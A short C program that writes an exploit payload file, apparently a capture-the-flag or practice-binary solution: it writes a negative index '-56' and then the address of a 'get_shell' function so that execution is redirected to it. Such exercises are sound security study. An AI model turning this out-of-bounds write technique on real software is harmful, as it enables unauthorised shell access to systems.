#include <stdio.h>

int main(void)
{
    FILE *fp = fopen("payload.txt", "w");

    fputc('-', fp);
    fputc('5', fp);
    fputc('6', fp);
    fputc('\n', fp);

    // get_shell: 0x004005eb
    fputc(0xeb, fp);
    fputc(0x05, fp);
    fputc(0x40, fp);
    fputc(0x00, fp);
    
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);

    fclose(fp);
    return 0;
}